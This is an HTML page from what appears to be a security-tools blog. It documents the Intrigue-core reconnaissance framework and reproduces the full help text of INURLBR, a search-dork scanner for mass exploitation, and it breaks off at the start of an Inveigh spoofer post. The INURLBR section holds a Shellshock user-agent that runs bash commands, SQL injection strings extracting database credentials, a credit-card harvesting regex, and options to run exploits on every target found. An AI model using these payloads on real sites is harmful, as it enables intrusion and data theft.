    <article class="post hentry" id="8363986840833337351" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Intrigue - Intelligence Gathering Framework  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8363986840833337351" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://4.bp.blogspot.com/-3nACeWSAdXQ/VdyXucXwVSI/AAAAAAAAEiQ/1ujOCcr5KKU/s1600/intrigue-core.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="404" src="http://4.bp.blogspot.com/-3nACeWSAdXQ/VdyXucXwVSI/AAAAAAAAEiQ/1ujOCcr5KKU/s640/intrigue-core.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Intrigue-core is an API-first intelligence gathering framework for Internet reconnaissance and research.
      </div> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;"> Setting up a development environment</span></b>
      <br> 
      <br> 
      <div style="text-align: justify;">
        The following are presumed available and configured in your environment
      </div> 
      <ul> 
       <li style="text-align: justify;">redis</li> 
       <li style="text-align: justify;">sudo</li> 
       <li style="text-align: justify;">nmap</li> 
       <li style="text-align: justify;">zmap</li> 
       <li style="text-align: justify;">masscan</li> 
       <li style="text-align: justify;">java runtime</li> 
      </ul> 
      <div style="text-align: justify;">
        Sudo is used to allow root access for certain commands ^ , so make sure this doesn't require a password:
      </div> 
      <pre><code>your-username ALL = NOPASSWD: /usr/bin/masscan, /usr/sbin/zmap, /usr/bin/nmap
</code></pre> 
      <br> 
      <b><span style="font-size: large;"> Starting up...</span></b>
      <br> 
      <br> 
      <div style="text-align: justify;">
        Make sure you have redis installed and running. (Use Homebrew if you're on OSX).
      </div> 
      <div style="text-align: justify;">
        Install all gem dependencies with Bundler (
       <a href="http://bundler.io/">http://bundler.io/</a>)
      </div> 
      <pre><code>$ bundle install
</code></pre> Start the web and background workers. Intrigue will start on 127.0.0.0:7777.
      <br> 
      <pre><code>$ foreman start
</code></pre> Now, browse to the web interface.
      <br> 
      <br> 
      <b><span style="font-size: large;"> Using the web interface</span></b>
      <br> 
      <br> 
      <div style="text-align: justify;">
        To use the web interface, browse to 
       <a href="http://127.0.0.1:7777/">http://127.0.0.1:7777</a>
      </div> 
      <div style="text-align: justify;">
        Getting started should be pretty straightforward, try running a "dns_brute_sub" task on your domain. Now, try with the "use_file" option set to true.
      </div> 
      <br> 
      <b><span style="font-size: large;"> API usage via core-cli:</span></b>
      <br> 
      <br> A command line utility has been added for convenience, core-cli.
      <br> List all available tasks:
      <br> 
      <pre><code>$ bundle exec ./core-cli.rb list
</code></pre> Start a task:
      <br> 
      <pre><code>$ bundle exec ./core-cli.rb start dns_lookup_forward DnsRecord#intrigue.io
</code></pre> Start a task with options:
      <br> 
      <pre><code>$ bundle exec ./core-cli.rb start dns_brute_sub DnsRecord#intrigue.io resolver=8.8.8.8#brute_list=1,2,3,4,www#use_permutations=true
[+] Starting task
[+] Task complete!
[+] Start Results
  DnsRecord#www.intrigue.io
  IpAddress#192.0.78.13
[ ] End Results
[+] Task Log:
[ ] : Got allowed option: resolver
[ ] : Allowed option: {:name=&gt;"resolver", :type=&gt;"String", :regex=&gt;"ip_address", :default=&gt;"8.8.8.8"}
[ ] : Regex should match an IP Address
[ ] : No need to convert resolver to a string
[+] : Allowed user_option! {"name"=&gt;"resolver", "value"=&gt;"8.8.8.8"}
[ ] : Got allowed option: brute_list
[ ] : Allowed option: {:name=&gt;"brute_list", :type=&gt;"String", :regex=&gt;"alpha_numeric_list", :default=&gt;["mx", "mx1", "mx2", "www", "ww2", "ns1", "ns2", "ns3", "test", "mail", "owa", "vpn", "admin", "intranet", "gateway", "secure", "admin", "service", "tools", "doc", "docs", "network", "help", "en", "sharepoint", "portal", "public", "private", "pub", "zeus", "mickey", "time", "web", "it", "my", "photos", "safe", "download", "dl", "search", "staging"]}
[ ] : Regex should match an alpha-numeric list
[ ] : No need to convert brute_list to a string
[+] : Allowed user_option! {"name"=&gt;"brute_list", "value"=&gt;"1,2,3,4,www"}
[ ] : Got allowed option: use_permutations
[ ] : Allowed option: {:name=&gt;"use_permutations", :type=&gt;"Boolean", :regex=&gt;"boolean", :default=&gt;true}
[ ] : Regex should match a boolean
[+] : Allowed user_option! {"name"=&gt;"use_permutations", "value"=&gt;true}
[ ] : user_options: [{"resolver"=&gt;"8.8.8.8"}, {"brute_list"=&gt;"1,2,3,4,www"}, {"use_permutations"=&gt;true}]
[ ] : Task: dns_brute_sub
[ ] : Id: fddc7313-52f6-4d5a-9aad-fd39b0428ca5
[ ] : Task entity: {"type"=&gt;"DnsRecord", "attributes"=&gt;{"name"=&gt;"intrigue.io"}}
[ ] : Task options: [{"resolver"=&gt;"8.8.8.8"}, {"brute_list"=&gt;"1,2,3,4,www"}, {"use_permutations"=&gt;true}]
[ ] : Option configured: resolver=8.8.8.8
[ ] : Option configured: use_file=false
[ ] : Option configured: brute_file=dns_sub.list
[ ] : Option configured: use_mashed_domains=false
[ ] : Option configured: brute_list=1,2,3,4,www
[ ] : Option configured: use_permutations=true
[ ] : Using provided brute list
[+] : Using subdomain list: ["1", "2", "3", "4", "www"]
[+] : Looks like no wildcard dns. Moving on.
[-] : Hit exception: no address for 1.intrigue.io
[-] : Hit exception: no address for 2.intrigue.io
[-] : Hit exception: no address for 3.intrigue.io
[-] : Hit exception: no address for 4.intrigue.io
[+] : Resolved Address 192.0.78.13 for www.intrigue.io
[+] : Creating entity: DnsRecord, {:name=&gt;"www.intrigue.io"}
[+] : Creating entity: IpAddress, {:name=&gt;"192.0.78.13"}
[ ] : Adding permutations: www1, www2
[-] : Hit exception: no address for www1.intrigue.io
[-] : Hit exception: no address for www2.intrigue.io
[+] : Ship it!
[ ] : Sending to Webhook: http://localhost:7777/v1/task_runs/fddc7313-52f6-4d5a-9aad-fd39b0428ca5
</code></pre> Check for a list of subdomains on intrigue.io:
      <br> 
      <pre><code>$ bundle exec ./core-cli.rb start dns_brute_sub DnsRecord#intrigue.io resolver=8.8.8.8#brute_list=a,b,c,proxy,test,www
</code></pre> Check the Alexa top 1000 domains for the existence of security headers:
      <br> 
      <pre><code>$ for x in `cat data/domains.txt | head -n 1000`; do bundle exec ./core-cli.rb start dns_brute_sub DnsRecord#$x;done
</code></pre> 
      <br> 
      <b><span style="font-size: large;"> API usage via rubygem</span></b>
      <br> 
      <br> 
      <pre><code>$ gem install intrigue
$ irb

&gt; require 'intrigue'
&gt; x =  Intrigue.new

  # Create an entity hash, must have a :type key
  # and (in the case of most tasks)  a :attributes key
  # with a hash containing a :name key (as shown below)
&gt; entity = {
    :type =&gt; "String",
    :attributes =&gt; { :name =&gt; "intrigue.io"}
  }

  # Create a list of options (this can be empty)
&gt; options_list = [
    { :name =&gt; "resolver", :value =&gt; "8.8.8.8" }
  ]

&gt; x.start "example", entity_hash, options_list
&gt; id  = x.start "example", entity_hash, options_list
&gt; puts x.get_log id
&gt; puts x.get_result id
</code></pre> 
      <br> 
      <b><span style="font-size: large;"> API usage via curl:</span></b>
      <br> 
      <br> 
      <div style="text-align: justify;">
        You can use the tried and true curl utility to request a task run. Specify the task type, specify an entity, and the appropriate options:
      </div> 
      <pre><code>$ curl -s -X POST -H "Content-Type: application/json" -d '{ "task": "example", "entity": { "type": "String", "attributes": { "name": "8.8.8.8" } }, "options": {} }' http://127.0.0.1:7777/v1/task_runs
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/intrigueio/intrigue-core" target="_blank">Download Intrigue-core</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="5102559918842938388" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> INURLBR - Advanced Search in Multiple Search Engines  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-5102559918842938388" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-vM0qkYVttDM/VWZv6iaGXiI/AAAAAAAAEGc/QPUgrbujPyQ/s1600/SCANNER%2B-%2BINURLBR.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="354" src="http://2.bp.blogspot.com/-vM0qkYVttDM/VWZv6iaGXiI/AAAAAAAAEGc/QPUgrbujPyQ/s640/SCANNER%2B-%2BINURLBR.png" width="640"></a>
      </div> 
      <br> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-pM0v3MN2c1E/VWZyKudDarI/AAAAAAAAEGo/u5PJS1mjwUU/s1600/SCANNER-INURLBR.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="310" src="http://3.bp.blogspot.com/-pM0v3MN2c1E/VWZyKudDarI/AAAAAAAAEGo/u5PJS1mjwUU/s640/SCANNER-INURLBR.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Advanced search in search engines, enables analysis provided to exploit GET / POST capturing emails &amp; urls, with an internal custom validation junction for each target / url found.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        INURLBR scanner was developed by Cleiton Pinheiro, owner and founder of INURL - BRASIL.
      </div> 
      <br> 
      <div style="text-align: justify;">
        Tool made ??in PHP that can run on different Linux distributions helps hackers / security professionals in their specific searches.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        With several options are automated methods of exploration, AND SCANNER is known for its ease of use and performasse.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        The inspiration to create the inurlbr scanner, was the XROOT Scan 5.2 application.
      </div> 
      <br> 
      <div style="text-align: justify;"> 
       <strong>Long desription</strong>
      </div> 
      <br> 
      <div style="text-align: justify;">
        The INURLBR tool was developed aiming to meet the need of Hacking community.
      </div> 
      <div style="text-align: justify;">
        Purpose: Make advanced searches to find potential vulnerabilities in web applications known as Google Hacking with various options and search filters, this tool has an absurd power of search engines available with (24) + 6 engines special(deep web)
      </div> 
      <ul> 
       <li style="text-align: justify;">&nbsp; - Possibility generate IP ranges or random_ip and analyze their targets.</li> 
       <li style="text-align: justify;">&nbsp; - Customization of&nbsp; HTTP-HEADER, USER-AGET, URL-REFERENCE.</li> 
       <li style="text-align: justify;">&nbsp; - Execution external to exploit certain targets.</li> 
       <li style="text-align: justify;">&nbsp; - Generator dorks random or set file dork.</li> 
       <li style="text-align: justify;">&nbsp; - Option to set proxy, file proxy list, http proxy, file http proxy.</li> 
       <li style="text-align: justify;">&nbsp; - Set time random proxy.</li> 
       <li style="text-align: justify;">&nbsp; - It is possible to use TOR ip Random.</li> 
       <li style="text-align: justify;">&nbsp; - Debug processes urls, http request, process irc.</li> 
       <li style="text-align: justify;">&nbsp; - Server communication irc sending vulns urls for chat room.</li> 
       <li style="text-align: justify;">&nbsp; - Possibility injection exploit GET / POST =&gt; SQLI, LFI, LFD.</li> 
       <li style="text-align: justify;">&nbsp; - Filter and validation based regular expression.</li> 
       <li style="text-align: justify;">&nbsp; - Extraction of email and url.</li> 
       <li style="text-align: justify;">&nbsp; - Validation using http-code.</li> 
       <li style="text-align: justify;">&nbsp; - Search pages based on strings file.</li> 
       <li style="text-align: justify;">&nbsp; - Exploits commands manager.</li> 
       <li style="text-align: justify;">&nbsp; - Paging limiter on search engines.</li> 
       <li style="text-align: justify;">&nbsp; - Beep sound when trigger vulnerability note.</li> 
       <li style="text-align: justify;">&nbsp; - Use text file as a data source for urls tests.</li> 
       <li style="text-align: justify;">&nbsp; - Find personalized strings in return values of the tests.</li> 
       <li style="text-align: justify;">&nbsp; - Validation vulnerability shellshock.</li> 
       <li style="text-align: justify;">&nbsp; - File validation values wordpress wp-config.php.</li> 
       <li style="text-align: justify;">&nbsp; - Execution sub validation processes.</li> 
       <li style="text-align: justify;">&nbsp; - Validation syntax errors database and programmin.</li> 
       <li style="text-align: justify;">&nbsp; - Data encryption as native parameter.</li> 
       <li style="text-align: justify;">&nbsp; - Random google host.</li> 
       <li style="text-align: justify;">&nbsp; - Scan port.</li> 
       <li style="text-align: justify;">&nbsp; - Error Checking &amp; values??:</li> 
      </ul> 
      <div style="text-align: justify;"> 
       <strong>LIB &amp; PERMISSION:</strong>
      </div> 
      <ul> 
       <li style="text-align: justify;">PHP Version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5.4.7</li> 
       <li style="text-align: justify;">php5-curl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LIB</li> 
       <li style="text-align: justify;">php5-cli&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; LIB &nbsp;</li> 
       <li style="text-align: justify;">cURL support&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; enabled</li> 
       <li style="text-align: justify;">cURL Information&nbsp;&nbsp;&nbsp; 7.24.0</li> 
       <li style="text-align: justify;">allow_url_fopen&nbsp;&nbsp;&nbsp;&nbsp; On</li> 
       <li style="text-align: justify;">permission&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Reading &amp; Writing</li> 
       <li style="text-align: justify;">User&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; root privilege, or is in the sudoers group</li> 
       <li style="text-align: justify;">Operating system&nbsp;&nbsp;&nbsp; LINUX</li> 
       <li style="text-align: justify;">Proxy random&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TOR</li> 
       <li style="text-align: justify;">PERMISSION EXECUTION: chmod +x inurlbr.php</li> 
       <li style="text-align: justify;">INSTALLING LIB CURL: sudo apt-get install php5-curl</li> 
       <li style="text-align: justify;">INSTALLING LIB CLI: sudo apt-get install php5-cli</li> 
       <li style="text-align: justify;">INSTALLING PROXY TOR <a href="https://www.torproject.org/docs/debian.html.en">https://www.torproject.org/docs/debian.html.en</a></li> 
      </ul> 
      <pre><code>resume: apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl</code></pre> 
      <br> 
      <b><span style="font-size: large;">Help:</span></b>
      <br> 
      <pre><code>-h
--help   Alternative long length help command.
--ajuda  Command to specify Help.
--info   Information script.
--update Code update.    
-q       Choose which search engine you want through [1...24] / [e1..6]]:
     [options]:
     1   - GOOGLE / (CSE) GENERIC RANDOM / API
     2   - BING
     3   - YAHOO BR
     4   - ASK
     5   - HAO123 BR
     6   - GOOGLE (API)
     7   - LYCOS
     8   - UOL BR
     9   - YAHOO US
     10  - SAPO
     11  - DMOZ
     12  - GIGABLAST
     13  - NEVER
     14  - BAIDU BR
     15  - YANDEX
     16  - ZOO
     17  - HOTBOT
     18  - ZHONGSOU
     19  - HKSEARCH
     20  - EZILION
     21  - SOGOU
     22  - DUCK DUCK GO
     23  - BOOROW
     24  - GOOGLE(CSE) GENERIC RANDOM
     ----------------------------------------
                 SPECIAL MOTORS
     ----------------------------------------
     e1  - TOR FIND
     e2  - ELEPHANT
     e3  - TORSEARCH
     e4  - WIKILEAKS
     e5  - OTN
     e6  - EXPLOITS SHODAN
     ----------------------------------------
     all - All search engines / not special motors
     Default:    1
     Example: -q {op}
     Usage:   -q 1
              -q 5
               Using more than one engine:  -q 1,2,5,6,11,24
               Using all engines:      -q all

 --proxy Choose which proxy you want to use through the search engine:
     Example: --proxy {proxy:port}
     Usage:   --proxy localhost:8118
              --proxy socks5://<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bddad2d2dad1d8d4d3c8cfd1fdd1d2dedcd1d5d2cec9">[email&nbsp;protected]</a>:9050
              --proxy http://admin:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="764744454542364741445847405846584f46">[email&nbsp;protected]</a>:8080

 --proxy-file Set font file to randomize your proxy to each search engine.
     Example: --proxy-file {proxys}
     Usage:   --proxy-file proxys_list.txt

 --time-proxy Set the time how often the proxy will be exchanged.
     Example: --time-proxy {second}
     Usage:   --time-proxy 10

 --proxy-http-file Set file with urls http proxy, 
     are used to bular capch search engines
     Example: --proxy-http-file {youfilehttp}
     Usage:   --proxy-http-file http_proxys.txt


 --tor-random Enables the TOR function, each usage links an unique IP.

 -t  Choose the validation type: op 1, 2, 3, 4, 5
     [options]:
     1   - The first type uses default errors considering the script:
     It establishes connection with the exploit through the get method.
     Demo: www.alvo.com.br/pasta/index.php?id={exploit}

     2   -  The second type tries to valid the error defined by: -a='VALUE_INSIDE_THE _TARGET'
     It also establishes connection with the exploit through the get method
     Demo: www.alvo.com.br/pasta/index.php?id={exploit}

     3   - The third type combine both first and second types:
     Then, of course, it also establishes connection with the exploit through the get method
     Demo: www.target.com.br{exploit}
     Default:    1
     Example: -t {op}
     Usage:   -t 1

     4   - The fourth type a validation based on source file and will be enabled scanner standard functions.
     The source file their values are concatenated with target url.
     - Set your target with command --target {http://target}
     - Set your file with command -o {file}
     Explicative:
     Source file values:
     /admin/index.php?id=
     /pag/index.php?id=
     /brazil.php?new=
     Demo: 
     www.target.com.br/admin/index.php?id={exploit}
     www.target.com.br/pag/index.php?id={exploit}
     www.target.com.br/brazil.php?new={exploit}

     5   - (FIND PAGE) The fifth type of validation based on the source file,
     Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
     - Set your target with command --target {http://target}
     - Set your file with command -o {file}
     Explicative:
     Source file values:
     /admin/admin.php
     /admin.asp
     /admin.aspx
     Demo: 
     www.target.com.br/admin/admin.php
     www.target.com.br/admin.asp
     www.target.com.br/admin.aspx
     Observation: If it shows the code 200 will be separated in the output file

     DEFAULT ERRORS:  

     [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
     [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
     [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
     [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
     [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
     [*]ERROR INDEFINITE


 --dork Defines which dork the search engine will use.
     Example: --dork {dork}
     Usage:   --dork 'site:.gov.br inurl:php? id'
     - Using multiples dorks:
     Example: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
     Usage:   --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'

 --dork-file Set font file with your search dorks.
     Example: --dork-file {dork_file}
     Usage:   --dork-file 'dorks.txt'

 --exploit-get Defines which exploit will be injected through the GET method to each URL found.
     Example: --exploit-get {exploit_get}
     Usage:   --exploit-get "?'´%270x27;"

 --exploit-post Defines which exploit will be injected through the POST method to each URL found.
     Example: --exploit-post {exploit_post}
     Usage:   --exploit-post 'field1=valor1&amp;field2=valor2&amp;field3=?´0x273exploit;&amp;botao=ok'

 --exploit-command Defines which exploit/parameter will be executed in the options: --command-vul/ --command-all.   
     The exploit-command will be identified by the paramaters: --command-vul/ --command-all as _EXPLOIT_      
     Ex --exploit-command '/admin/config.conf' --command-all 'curl -v _TARGET__EXPLOIT_'
     _TARGET_ is the specified URL/TARGET obtained by the process
     _EXPLOIT_ is the exploit/parameter defined by the option --exploit-command.
     Example: --exploit-command {exploit-command}
     Usage:   --exploit-command '/admin/config.conf'  

 -a  Specify the string that will be used on the search script:
     Example: -a {string}
     Usage:   -a '&lt;title&gt;hello world&lt;/title&gt;'

 -d  Specify the script usage op 1, 2, 3, 4, 5.
     Example: -d {op}
     Usage:   -d 1 /URL of the search engine.
              -d 2 /Show all the url.
              -d 3 /Detailed request of every URL.
              -d 4 /Shows the HTML of every URL.
              -d 5 /Detailed request of all URLs.
              -d 6 /Detailed PING - PONG irc.    

 -s  Specify the output file where it will be saved the vulnerable URLs.

     Example: -s {file}
     Usage:   -s your_file.txt

 -o  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
     Example: -o {file_where_my_urls_are}
     Usage:   -o tests.txt

 --persist  Attempts when Google blocks your search.
     The script tries to another google host / default = 4
     Example: --persist {number_attempts}
     Usage:   --persist 7

 --ifredirect  Return validation method post REDIRECT_URL
     Example: --ifredirect {string_validation}
     Usage:   --ifredirect '/admin/painel.php'

 -m  Enable the search for emails on the urls specified.

 -u  Enables the search for URL lists on the url specified.

 --gc Enable validation of values ??with google webcache.

 --pr  Progressive scan, used to set operators (dorks), 
     makes the search of a dork and valid results, then goes a dork at a time.

 --file-cookie Open cookie file.

 --save-as Save results in a certain place.

 --shellshock Explore shellshock vulnerability by setting a malicious user-agent.

 --popup Run --command all or vuln in a parallel terminal.

 --cms-check Enable simple check if the url / target is using CMS.

 --no-banner Remove the script presentation banner.

 --unique Filter results in unique domains.

 --beep Beep sound when a vulnerability is found.

 --alexa-rank Show alexa positioning in the results.

 --robots Show values file robots.

 --range Set range IP.
      Example: --range {range_start,rage_end}
      Usage:   --range '172.16.0.5#172.16.0.255'

 --range-rand Set amount of random ips.
      Example: --range-rand {rand}
      Usage:   --range-rand '50'

 --irc Sending vulnerable to IRC / server channel.
      Example: --irc {server#channel}
      Usage:   --irc 'irc.rizon.net#inurlbrasil'

 --http-header Set HTTP header.
      Example: --http-header {youemail}
      Usage:   --http-header 'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm="Top Secret"'

 --sedmail Sending vulnerable to email.
      Example: --sedmail {youemail}
      Usage:   --sedmail <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b4cddbc1d1d9d5ddd8f4dddac1c6d89ad7dbd99ad6c6">[email&nbsp;protected]</a>

 --delay Delay between research processes.
      Example: --delay {second}
      Usage:   --delay 10

 --time-out Timeout to exit the process.
      Example: --time-out {second}
      Usage:   --time-out 10

 --ifurl Filter URLs based on their argument.
      Example: --ifurl {ifurl}
      Usage:   --ifurl index.php?id=

 --ifcode Valid results based on your return http code.
      Example: --ifcode {ifcode}
      Usage:   --ifcode 200

 --ifemail Filter E-mails based on their argument.
     Example: --ifemail {file_where_my_emails_are}
     Usage:   --ifemail sp.gov.br

 --url-reference Define referring URL in the request to send him against the target.
      Example: --url-reference {url}
      Usage:   --url-reference http://target.com/admin/user/valid.php

 --mp Limits the number of pages in the search engines.
     Example: --mp {limit}
     Usage:   --mp 50

 --user-agent Define the user agent used in its request against the target.
      Example: --user-agent {agent}
      Usage:   --user-agent 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
      Usage-exploit / SHELLSHOCK:   
      --user-agent '() { foo;};echo; /bin/bash -c "expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;"'
      Complete command:    
      php inurlbr.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'

 --sall Saves all urls found by the scanner.
     Example: --sall {file}
     Usage:   --sall your_file.txt

 --command-vul Every vulnerable URL found will execute this command parameters.
     Example: --command-vul {command}
     Usage:   --command-vul 'nmap sV -p 22,80,21 _TARGET_'
              --command-vul './exploit.sh _TARGET_ output.txt'
              --command-vul 'php miniexploit.php -t _TARGET_ -s output.txt'

 --command-all Use this commmand to specify a single command to EVERY URL found.
     Example: --command-all {command}
     Usage:   --command-all 'nmap sV -p 22,80,21 _TARGET_'
              --command-all './exploit.sh _TARGET_ output.txt'
              --command-all 'php miniexploit.php -t _TARGET_ -s output.txt'
    [!] Observation:

    _TARGET_ will be replaced by the URL/target found, although if the user  
    doesn't input the get, only the domain will be executed.

    _TARGETFULL_ will be replaced by the original URL / target found.

    _TARGETXPL_ will be replaced by the original URL / target found + EXPLOIT --exploit-get.

    _TARGETIP_ return of ip URL / target found.

    _URI_ Back URL set of folders / target found.

    _RANDOM_ Random strings.

    _PORT_ Capture port of the current test, within the --port-scan process.

    _EXPLOIT_  will be replaced by the specified command argument --exploit-command.
   The exploit-command will be identified by the parameters --command-vul/ --command-all as _EXPLOIT_

 --replace Replace values ??in the target URL.
    Example:  --replace {value_old[INURL]value_new}
     Usage:   --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'
              --replace 'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'
              --replace 'index.aspx?id=[INURL]index.aspx?id=1%27´'

 --remove Remove values ??in the target URL.
      Example: --remove {string}
      Usage:   --remove '/admin.php?id=0'

 --regexp Using regular expression to validate his research, the value of the 
    Expression will be sought within the target/URL.
    Example:  --regexp {regular_expression}
    All Major Credit Cards:
    Usage:    --regexp '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'

    IP Addresses:
    Usage:    --regexp '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'

    EMAIL:   
    Usage:    --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'


 ---regexp-filter Using regular expression to filter his research, the value of the 
     Expression will be sought within the target/URL.
    Example:  ---regexp-filter {regular_expression}
    EMAIL:   
    Usage:    ---regexp-filter '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'


    [!] Small commands manager:

 --exploit-cad Command register for use within the scanner.
    Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
    Example Format: NMAP::nmap -sV _TARGET_
    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
    Usage:    --exploit-cad 'NMAP::nmap -sV _TARGET_' 
    Observation: Each registered command is identified by an id of your array.
                 Commands are logged in exploits.conf file.

 --exploit-all-id Execute commands, exploits based on id of use,
    (all) is run for each target found by the engine.
     Example: --exploit-all-id {id,id}
     Usage:   --exploit-all-id 1,2,8,22

 --exploit-vul-id Execute commands, exploits based on id of use,
    (vull) run command only if the target was considered vulnerable.
     Example: --exploit-vul-id {id,id}
     Usage:   --exploit-vul-id 1,2,8,22

 --exploit-list List all entries command in exploits.conf file.


    [!] Running subprocesses:

 --sub-file  Subprocess performs an injection 
     strings in URLs found by the engine, via GET or POST.
     Example: --sub-file {youfile}
     Usage:   --sub-file exploits_get.txt

 --sub-get defines whether the strings coming from 
     --sub-file will be injected via GET.
     Usage:   --sub-get

 --sub-post defines whether the strings coming from 
     --sub-file will be injected via POST.
     Usage:   --sub-get


 --sub-cmd-vul Each vulnerable URL found within the sub-process
     will execute the parameters of this command.
     Example: --sub-cmd-vul {command}
     Usage:   --sub-cmd-vul 'nmap sV -p 22,80,21 _TARGET_'
              --sub-cmd-vul './exploit.sh _TARGET_ output.txt'
              --sub-cmd-vul 'php miniexploit.php -t _TARGET_ -s output.txt'

 --sub-cmd-all Run command to each target found within the sub-process scope.
     Example: --sub-cmd-all {command}
     Usage:   --sub-cmd-all 'nmap sV -p 22,80,21 _TARGET_'
              --sub-cmd-all './exploit.sh _TARGET_ output.txt'
              --sub-cmd-all 'php miniexploit.php -t _TARGET_ -s output.txt'


 --port-scan Defines ports that will be validated as open.
     Example: --port-scan {ports}
     Usage:   --port-scan '22,21,23,3306'

 --port-cmd Define command that runs when finding an open door.
     Example: --port-cmd {command}
     Usage:   --port-cmd './xpl _TARGETIP_:_PORT_'
              --port-cmd './xpl _TARGETIP_/file.php?sqli=1'

 --port-write Send values for door.
     Example: --port-write {'value0','value1','value3'}
     Usage:   --port-write "'NICK nk_test','USER nk_test 8 * :_ola','JOIN #inurlbrasil','PRIVMSG #inurlbrasil : minha_msg'"



    [!] Modifying values used within script parameters:

 md5 Encrypt values in md5.
     Example: md5({value})
     Usage:   md5(102030)
     Usage:   --exploit-get 'user?id=md5(102030)'

 base64 Encrypt values in base64.
     Example: base64({value})
     Usage:   base64(102030)
     Usage:   --exploit-get 'user?id=base64(102030)'

 hex Encrypt values in hex.
     Example: hex({value})
     Usage:   hex(102030)
     Usage:   --exploit-get 'user?id=hex(102030)'

 Generate random values.
     Example: random({character_counter})
     Usage:   random(8)
     Usage:   --exploit-get 'user?id=random(8)'

</code></pre> 
      <br> 
      <strong>Usage</strong>
      <br> To get a list of basic options and switches use:
      <br> 
      <pre><code>php inurlbr.php -h</code></pre> 
      <br> To get a list of all options and switches use:
      <br> 
      <pre><code>python inurlbr.php --help</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/googleinurl/SCANNER-INURLBR" target="_blank">Download&nbsp;INURLBR</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="7548387940545485709" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Inveigh - A Windows PowerShell LLMNR/NBNS spoofer with challenge/response capture over HTTP/SMB  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-7548387940545485709" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
